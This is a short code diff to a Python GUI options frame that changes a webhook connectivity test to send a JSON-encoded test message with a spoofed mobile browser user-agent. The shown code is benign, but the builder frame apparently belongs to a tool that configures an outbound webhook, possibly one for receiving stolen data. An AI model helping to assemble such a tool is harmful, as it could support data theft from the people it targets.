@@ -526,8 +526,8 @@ class BuilderOptionsFrame(ctk.CTkFrame):
 				
 
 				try:
-					data = {"content" : "Your webhook is working!"}
-					http = http.request("POST", webhook, fields= data, headers= {"Content-Type" : "application/json", "user-agent" : "Mozilla/5.0 (Linux; Android 10; SM-T510 Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/92.0.4515.159 Safari/537.36"})
+					data = json.dumps({"content" : "Your webhook is working!"}).encode()
+					http = http.request("POST", webhook, body= data, headers= {"Content-Type" : "application/json", "user-agent" : "Mozilla/5.0 (Linux; Android 10; SM-T510 Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/92.0.4515.159 Safari/537.36"})
 					status = http.status
 					if status == 204:
 						messagebox.showinfo("Success", "Your webhook seems to be working!")
